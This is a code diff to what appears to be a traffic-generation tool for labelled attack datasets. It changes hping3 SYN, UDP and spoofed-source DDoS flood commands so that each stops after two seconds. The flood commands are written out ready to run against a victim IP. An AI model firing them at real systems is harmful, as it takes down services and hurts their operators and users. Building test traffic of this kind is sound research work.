@@ -99,10 +99,10 @@ ATTACK_PHASES = [
     },
     {
         "label": "DoSSYNFlood",
-        "description": "hping3 TCP SYN flood (capped at 20,000 packets)",
+        "description": "hping3 TCP SYN flood (auto-stops after 2s; -c is ignored in --flood mode)",
         "default_duration": 30,
         "auto_cmd": (
-            "sudo hping3 -S --flood -p 80 -c 20000 {victim_ip}"
+            "sudo timeout -s INT 2 hping3 -S --flood -p 80 {victim_ip}"
         ),
     },
     {
@@ -111,10 +111,10 @@ ATTACK_PHASES = [
         # This exhausts bandwidth/CPU on the victim without a TCP handshake,
         # producing a very different traffic signature from the SYN flood above.
         "label": "DoSUDPFlood",
-        "description": "hping3 UDP flood targeting port 80",
+        "description": "hping3 UDP flood targeting port 80 (auto-stops after 2s)",
         "default_duration": 30,
         "auto_cmd": (
-            "sudo hping3 --udp --flood -p 80 -c 20000 {victim_ip}"
+            "sudo timeout -s INT 2 hping3 --udp --flood -p 80 {victim_ip}"
         ),
     },
     {
@@ -124,12 +124,12 @@ ATTACK_PHASES = [
         # '--rand-source' instructs hping3 to randomise the source IP per packet.
         # Note: requires root; spoofed packets will not receive responses.
         "label": "DDoSSYNFlood",
-        "description": "hping3 multi-source spoofed SYN flood simulating DDoS",
+        "description": "hping3 multi-source spoofed SYN flood simulating DDoS (auto-stops after 2s)",
         "default_duration": 30,
         "auto_cmd": (
-            "sudo hping3 -S --flood --rand-source -p 80 -c 10000 {victim_ip} & "
-            "sudo hping3 -S --flood --rand-source -p 443 -c 10000 {victim_ip} & "
-            "sudo hping3 -S --flood --rand-source -p 22 -c 5000 {victim_ip} & "
+            "sudo timeout -s INT 2 hping3 -S --flood --rand-source -p 80 {victim_ip} & "
+            "sudo timeout -s INT 2 hping3 -S --flood --rand-source -p 443 {victim_ip} & "
+            "sudo timeout -s INT 2 hping3 -S --flood --rand-source -p 22 {victim_ip} & "
             "wait"
         ),
     },
